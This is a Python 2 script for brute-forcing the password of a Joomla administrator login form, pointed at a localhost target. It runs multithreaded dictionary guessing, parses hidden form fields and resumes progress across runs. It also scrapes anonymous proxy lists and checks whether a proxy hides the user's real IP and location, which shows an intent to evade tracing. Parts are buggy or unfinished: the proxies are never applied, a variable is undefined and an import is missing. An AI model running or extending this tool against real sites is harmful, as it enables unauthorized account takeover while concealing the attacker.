import urllib2
import urllib
import cookielib
import threading
import sys
import Queue
from HTMLParser import HTMLParser
import socket





import random
import datetime
import re

# general settings
user_thread = 10
username = "admin"
wordlist_file = "dict.txt"
resume = None

# target specific settings
target_url = "http://localhost/joomla/administrator/index.php"
target_post = "http://localhost/joomla/administrator/index.php"
username_field= "username"
password_field= "passwd"
success_check = "Configuration"

class Bruter(object):

	def __init__(self, username, words):
		self.username = username
		self.password_q = words
		self.found = False
		print "Finished setting up for: %s" % username

	def run_bruteforce(self):	
		for i in range(user_thread):
			t = threading.Thread(target=self.web_bruter)
			t.start()

	def web_bruter(self):
		while not self.password_q.empty() and not self.found:
			brute = self.password_q.get().rstrip()
			
			# TODO : ADD PROXIE MOD
			proxy = select_randomProxyFromFile("proxyFromWeb.txt")
			print "=> " +str(proxy)
			jar = cookielib.FileCookieJar("cookies")
			opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(jar))
			
			response = opener.open(target_url)

			page = response.read()
			print "Trying: %s : %s " % (self.username,brute)

			# parse out the hidden fields
			parser = BruteParser()
			parser.feed(page)

			post_tags = parser.tag_results

			# add our username and password fields
			post_tags[username_field] = self.username
			post_tags[password_field] = brute

			login_data = urllib.urlencode(post_tags)
			login_response = opener.open(target_post, login_data)
			login_result = login_response.read()

			# write html response in a tmp file
			resultFile = open("response.tmp", "w")
			resultFile.write(login_result)
			resultFile.close()

			# Looking for unusual response
			resultFile = open("response.tmp", "r")
			cmpt = 0
			for line in resultFile:
				cmpt += 1
			resultFile.close()

			if(cmpt < 3):
				print "[-] Strange response for password: %s" % brute
				failPassword = open("strangePassword.txt", "a")
				failPassword.write(str(password)+"\n")
				failPassword.close()

			if success_check in login_result:
				self.found = True
				print "--------------------------"
				print "[*] Bruteforce successful."
				print "[*] Username: %s" % username
				print "[*] Password: %s" % brute
				print "[*] Waiting for other threads to exit..."


class BruteParser(HTMLParser):
	def __init__(self):
		HTMLParser.__init__(self)
		self.tag_results = {}

	def handle_starttag(self, tag, attrs):
		if tag == "input":
			tag_name = None
			tag_value = None
			for name,value in attrs:
				if name == "name":
					tag_name = value
				if name == "value":
					tag_value = value
			if tag_name is not None:
				self.tag_results[tag_name] = value



def load_dictionnary(dictName):
	"""
	return 10 password from dictName in a Queue object.
	write last password sent in the password.tmp file.
	"""
	lastPassowrdTested = 0
	listOfPassword = []

	# get the last password tested
	tmpFile = open("password.tmp", "r")
	cmpt = 0
	for line in tmpFile:
		lineWithoutBackN = line.split("\n")
		lineWithoutBackN = lineWithoutBackN[0]
		lastPassowrdTested = lineWithoutBackN
		cmpt += 1
	tmpFile.close()

	# Create the password list
	cmpt2 = 0
	dictionnary = open(dictName, "r")
	if(cmpt == 0):
		for line in dictionnary:
			lineWithoutBackN = line.split("\n")
			lineWithoutBackN = lineWithoutBackN[0]
			password = lineWithoutBackN
			if(len(listOfPassword) < 10):
				listOfPassword.append(password)
			cmpt2 += 1
	else:
		record = 0
		for line in dictionnary:
			lineWithoutBackN = line.split("\n")
			lineWithoutBackN = lineWithoutBackN[0]
			password = lineWithoutBackN
			if(record):
				if(len(listOfPassword) < 10):
					listOfPassword.append(password)
			if(password == lastPassowrdTested):
				record = 1
				cmpt2 += 1
	dictionnary.close()

	# write last password tested for next pass
	tmpFile = open("password.tmp", "w")
	if(len(listOfPassword) > 0):
		tmpFile.write(listOfPassword[-1])
	tmpFile.close()

	# convert into Queue
	queryQ = Queue.Queue()
	words = [queryQ.put(query) for query in listOfPassword]

	return queryQ

def clean():
	"""
	IN PROGRESS
	-> init tmp file
	"""
	tmpFile = open("password.tmp", "w")
	tmpFile.close()

	strangePassword = open("strangePassword.txt", "w")
	strangePassword.close()




def select_randomProxyFromFile(proxyFile):
	"""
	-> select randomly a proxy from the file
	proxyFile
	-> return a proxy (string)
	"""
	proxyData = open(proxyFile, "r")
	listOfProxy = []
	for line in proxyData:
		lineWithoutBackN = line.split("\n")
		lineWithoutBackN = lineWithoutBackN[0]
		listOfProxy.append(lineWithoutBackN)
	proxyData.close()
	randomSelection = random.randint(0, len(listOfProxy) -1)
	selectedProxy = listOfProxy[randomSelection]

	return selectedProxy


def create_proxyFileFromWeb():
	"""
	-> get a list of Elite proxy from the site https://vpndock.com/liste-proxy
	-> Store the list in proxyFromWeb.txt file

	TODO:
	- not always working (problem with <br /> character while parsing response)
	- catch html
	"""
	ressource = "https://vpndock.com/liste-proxy/"
	jar = cookielib.FileCookieJar("cookies")
	opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(jar))
	
	# Handle http error
	try:
		response = opener.open(ressource)
	except HTTPError as e:
		print "tardis"

	page = response.read()
	responseFile = open("proxySiteResponse.tmp", "w")
	responseFile.write(page)
	responseFile.close()

	htmlFile = open("proxySiteResponse.tmp", "r")
	listOfFetchedProxy = []
	record = 0
	for line in htmlFile:
		if("Liste de proxy elite du " in line):

			lineInArray = line.split(" ")
			for element in lineInArray:
				if("/" in element and "<" not in element):
					elementInArray = element.split("/")
					day = elementInArray[0]
					month = elementInArray[1]
					date = str(day)+"_"+str(month)

			record = 1
		if(record):

			# Sometimes it's seems to be "<br/>", not "<br />"
			lineInArray = line.split("<br />")
			if(len(lineInArray) > 1):
				lineToParse = lineInArray[0]
				lineToParse = lineToParse.replace("<p>", "")
				lineToParse = lineToParse.replace("<blockquote>", "")
				lineToParse = lineToParse.replace("&#48", "0")
				lineToParse = lineToParse.replace("&#49", "1")
				lineToParse = lineToParse.replace("&#50", "2")
				lineToParse = lineToParse.replace("&#51", "3")
				lineToParse = lineToParse.replace("&#52", "4")
				lineToParse = lineToParse.replace("&#53", "5")
				lineToParse = lineToParse.replace("&#54", "6")
				lineToParse = lineToParse.replace("&#55", "7")
				lineToParse = lineToParse.replace("&#56", "8")
				lineToParse = lineToParse.replace("&#57", "9")		
				lineToParse = lineToParse.replace(";", "")
				listOfFetchedProxy.append(lineToParse)
			if("</p></blockquote>" in line):
				record = 0
	htmlFile.close()



	#############################
	# Playing with another site #
	#############################
	ressource2 = "http://www.gatherproxy.com/proxylist/anonymity/?t=Elite"
	jar = cookielib.FileCookieJar("cookies")
	opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(jar))
	
	# Handle http error
	try:
		response = opener.open(ressource2)
	except HTTPError as e:
		print "tardis"

	page = response.read()
	responseFile = open("proxySiteResponse2.tmp", "w")
	responseFile.write(page)
	responseFile.close()

	htmlFile = open("proxySiteResponse2.tmp", "r")
	record = 0
	for line in htmlFile:

		if("id=\"tblproxy\"" in line):
			record = 1
		if(record and "</table>" in line):
			record = 0
		if(record and "gp.insertPrx" in line):
			lineInArray = line.split("{")
			lineInArray = lineInArray[1].split("}")
			lineInArray = lineInArray[0].split(",")
			for element in lineInArray:
				if("PROXY_IP" in element):
					elementInArray = element.split(":")
					proxy_adress = elementInArray[1]
					proxy_adress = proxy_adress.replace("\"", "")
				if("PROXY_PORT" in element):
					elementInArray = element.split(":")
					proxy_port = elementInArray[1]
					proxy_port = proxy_port.replace("\"", "")
					proxy_port = int(proxy_port, 16)

			proxy = str(proxy_adress)+":"+str(proxy_port)
			listOfFetchedProxy.append(proxy)

	htmlFile.close()






	# Write proxy file
	proxyFile = open("proxyFromWeb_"+date+".txt", "w")
	cmpt = 0
	for proxi in listOfFetchedProxy:
		if(cmpt == len(listOfFetchedProxy) - 1):
			proxyFile.write(proxi)
		else:
			proxyFile.write(proxi+"\n")
		cmpt += 1
	proxyFile.close()






def update_proxyFileFromWeb():
	"""
	-> Try to open a proxy file with the current date
	-> if fail (i.e there is no proxy file with today date)
	   run the create_proxyFileFromWeb() function
	"""

	now = datetime.datetime.now()
	month = now.month
	day = now.day
	if(day < 10):
		day = "0"+str(day)
	if(month < 10):
		month = "0"+str(month)
	date = str(day)+"_"+str(month)

	try:
		testFile = open("proxyFromWeb_"+date+".txt", "r")
		testFile.close()
		print "[*] proxy file up-to-date"
	except:
		print "[!] can't find & open up-to-date proxy file"
		print "[+] create new proxy file from web"
		create_proxyFileFromWeb()


def test_proxy(proxy):
	"""
	IN PROGRESS
	-> Seems to work !!!
	TODO:
	-> check if timeout come from bad proxies
	-> deal with connection timeout
	"""

	print proxy
	
	# Connect to a localisation site using a proxy
	# Problem with proxy (timeout, not even sure the whole thing work)

	
	localisationSiteUrl = "http://www.ipinfodb.com/my_ip_location.php"
	#localisationSiteUrl = "https://geoiptool.com/"
	# http://www.my-ip-address.net/fr
	jar = cookielib.FileCookieJar("cookies")
	request = urllib2.Request(localisationSiteUrl)
	

	proxy_handler = urllib2.ProxyHandler({'http': proxy})
	#proxy_auth_handler = urllib2.HTTPBasicAuthHandler()
	#opener = urllib2.build_opener(proxy_handler, proxy_auth_handler)
	#response = opener.open(localisationSiteUrl)

	opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(jar), urllib2.ProxyHandler({'http': proxy}))
	#opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(jar))
	#opener = urllib2.build_opener(proxy_handler)
	urllib2.install_opener(opener) # to try
	
	#responseFile = open("proxySiteResponse.tmp", "w")
	#responseFile.write(page)
	#responseFile.close()



	# get response from the site
	targetReached = 1
	try:
		response = opener.open(request)
	except socket.timeout as e:
		print "[!] Connection timeout"
		targetReached = 0
	if(targetReached):
		page = response.read()
		tmpFile = open("localisationResponse.tmp", "w")
		tmpFile.write(page)
		tmpFile.close()

		# parse response and get data ( i.e check ip adress & country)
		dataToParse = open("localisationResponse.tmp", "r")
		record = 0
		ipAdress = "not found"
		country = "not found"
		city = "not found"
		for line in dataToParse:
			lineWithoutBackN = line.split("\n")
			lineWithoutBackN = lineWithoutBackN[0]
			if(record):
				
				if(" <li>IP address : " in lineWithoutBackN):
					m = re.search('([0-9]{1,}\.[0-9]{1,}\.[0-9]{1,}\.[0-9]{1,})', lineWithoutBackN)
					ipAdress = str(m.group(0))
				if("<li>Country" in lineWithoutBackN):
					lineInArray = lineWithoutBackN.split(":")
					lineInArray = lineInArray[1].split("<")
					country = lineInArray[0]
				if("<li>City" in lineWithoutBackN):
					lineInArray = lineWithoutBackN.split(":")
					lineInArray = lineInArray[1].split("<")
					city = lineInArray[0]

			if("Information is provided by <a href=\"http://www.ip2location.com/?rid=1094\"" in lineWithoutBackN):
				record = 1
			if("Inaccurate result? Click <a href=\"report.php?ip=91.217.154.35\"" in lineWithoutBackN):
				record = 0
		dataToParse.close()

		# proxy evaluation
		ipProxy = proxy.split(":")
		ipProxy = ipProxy[0]
		if(ipProxy != ipAdress):
			print "[!] proxy "+str(ipProxy)+" is not safe"
			print "[!] we are traced back to "+ ipAdress +" ("+str(city)+", "+str(country) +")"
		else:
			print "[*] proxy "+str(ipProxy)+" is safe"
			print "[*] connection from "+str(city)+", "+str(country)




# Run the Attack
#clean()
#create_proxyFileFromWeb()
update_proxyFileFromWeb()
proxy = select_randomProxyFromFile("proxyFromWeb.txt")
test_proxy(proxy)
#print "=> " +str(proxy)
#words = load_dictionnary("dict.txt")
#bruter_obj = Bruter(username, words)
#bruter_obj.run_bruteforce()